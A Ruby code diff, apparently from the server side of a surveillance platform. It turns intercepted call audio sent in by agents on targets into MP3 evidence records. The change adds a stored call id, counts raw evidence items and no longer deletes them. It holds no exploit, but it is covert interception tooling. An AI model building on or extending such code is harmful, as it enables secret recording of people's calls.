@@ -139,10 +139,11 @@ end
 class Call
   include Tracer
   attr_writer :start_time
-  attr_reader :id, :peer, :duration, :sample_rate, :raw_ids, :evidence
+  attr_reader :bid, :id, :peer, :duration, :sample_rate, :raw_ids, :evidence, :raw_counter
 
   def initialize(peer, program, start_time, agent, target)
-    @id = "#{agent[:ident]}_#{agent[:instance]}_#{BSON::ObjectId.new}"
+    @bid = BSON::ObjectId.new
+    @id = "#{agent[:ident]}_#{agent[:instance]}_#{@bid}"
     @peer = peer
     @start_time = start_time
     @status = :queueing
@@ -150,7 +151,7 @@ class Call
     @program = program
     @duration = 0
     trace :info, "[CALL #{@id}] created new call for #{@peer}, starting at #{@start_time}"
-    @raw_ids = []
+    @raw_counter = 0
     @sample_rate = nil
 
     @agent = agent
@@ -222,19 +223,11 @@ class Call
     return @channels[evidence[:data][:channel]]
   end
 
-  def delete_raws
-    @raw_ids.each do |id|
-      RCS::DB::GridFS.delete(id, "evidence")
-      trace :debug, "deleted raw evidence #{id}"
-    end
-  end
-
   def close!
     # TODO: flush channels if samples queued
     @channels.each_value {|c| c.close!}
     trace :debug, "[CALL #{@id}] closing call for #{@peer}, starting at #{@start_time}"
     @evidence.update_attributes("data.status" => :complete) unless @evidence.nil?
-    delete_raws
     true
   end
   
@@ -245,9 +238,9 @@ class Call
   end
   
   def feed(evidence)
-
-    @raw_ids << evidence[:db_id]
-
+    
+    @raw_counter += 1
+    
     # if evidence is empty or call is closed, refuse feeding
     return false if closed?
 
@@ -299,25 +292,26 @@ class Call
   def store(peer, program, start_time, agent, target)
     evidence = ::Evidence.collection_class(target[:_id].to_s)
     evidence.create do |ev|
+      ev._id = @bid
       ev.aid = agent[:_id].to_s
       ev.type = :call
-
+      
       ev.da = start_time
       ev.dr = Time.now.to_i
       ev.rel = 0
       ev.blo = false
       ev.note = ""
-
+      
       ev.data ||= Hash.new
       ev.data[:peer] = peer
       ev.data[:program] = program
       ev.data[:duration] = 0
       ev.data[:status] = :recording
-
+      
       ev.save
     end
   end
-
+  
   def file_name
     "#{@id}_#{@peer}_#{@program}"
   end
@@ -370,15 +364,15 @@ class CallProcessor
     # if we have a call and accepts the evidence, that's the good one
     return @call if @call.accept? evidence and not @call.closed?
 
-    # otherwise, close the call and
-    close_call {|evidence, raw_ids| yield evidence, raw_ids}
+    # otherwise, close the call
+    close_call {|evidence| yield evidence}
     @call = create_call(evidence)
     @call
   end
-
+  
   def close_call
     return if @call.nil?
-    yield @call.evidence, @call.raw_ids if block_given?
+    yield @call.evidence if block_given?
     @call.close!
   end
 
@@ -398,23 +392,21 @@ class CallProcessor
     if end_call? evidence
       @call.close! unless @call.nil?
       @call = nil
-      RCS::DB::GridFS.delete(evidence[:db_id], "evidence")
-      trace :debug, "deleted raw evidence #{evidence[:db_id]}"
       return nil
     end
-
-    call = get_call(evidence) {|evidence, raw_ids| yield evidence, raw_ids}
+    
+    call = get_call(evidence) {|evidence| yield evidence}
     return nil if call.nil?
-
+    
     call.feed evidence do |sample_rate, left_pcm, right_pcm|
       encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
         File.open("#{call.file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
         write_to_grid(call, mp3_bytes)
       end
     end
-    nil
+    return call.bid, call.raw_counter
   end
-
+  
   def encode_mp3(sample_rate, left_pcm, right_pcm)
     # MP3Encoder will take care of resampling if necessary
     @encoder ||= ::MP3Encoder.new(2, sample_rate)
@@ -424,7 +416,7 @@ class CallProcessor
       end
     end
   end
-
+  
   def write_to_grid(call, mp3_bytes)
     db = Mongoid.database
     fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")
